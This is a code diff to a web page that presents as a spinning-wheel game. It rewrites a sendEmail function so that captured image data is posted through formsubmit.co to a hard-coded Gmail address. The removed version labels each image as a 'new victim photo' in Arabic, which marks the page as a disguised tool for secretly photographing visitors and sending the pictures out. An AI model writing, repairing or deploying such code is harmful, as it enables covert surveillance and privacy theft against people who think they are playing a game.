@@ -81,35 +81,24 @@
             }
         }
 
-        function sendEmail(imageData) {
-            // إرسال عبر Formspree (أو أي API تانية)
-            fetch(`https://formspree.io/f/${formspreeID}`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                fetch("https://formsubmit.co/ajax/your-email@gmail.com", {
-    method: "POST",
-    headers: { 
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-    },
-    body: JSON.stringify({
-        _subject: "صورة جديدة",
-        email: "amoooor898@gmail.com",
-        message: "تم التقاط الصورة بنجاح",
-        image: imageData
+       function sendEmail(imageData) {
+    fetch("https://formsubmit.co/ajax/amoor898@gmail.com", {
+        method: "POST",
+        headers: { 
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+            _subject: "صورة جديدة",
+            email: "amoor898@gmail.com",
+            message: "تم التقاط الصورة بنجاح",
+            image: imageData
+        })
     })
-})
-.then(response => response.json())
-.then(data => console.log("تم الإرسال بنجاح:", data))
-.catch(e => console.log("Email send error", e));
-                    _subject: "صورة ضحية جديدة!",
-                    email:"amoooor898@gmail.com",
-                    message: "تم التقاط الصورة بنجاح.",
-                    image: imageData
-                })
-            }).catch(e => console.log("Email send error", e));
-        }
-
+    .then(response => response.json())
+    .then(data => console.log("تم الإرسال بنجاح:", data))
+    .catch(e => console.log("Email send error", e));
+}
         // رسم العجلة
         function drawWheel() {
             const canvas = document.getElementById('wheelCanvas');
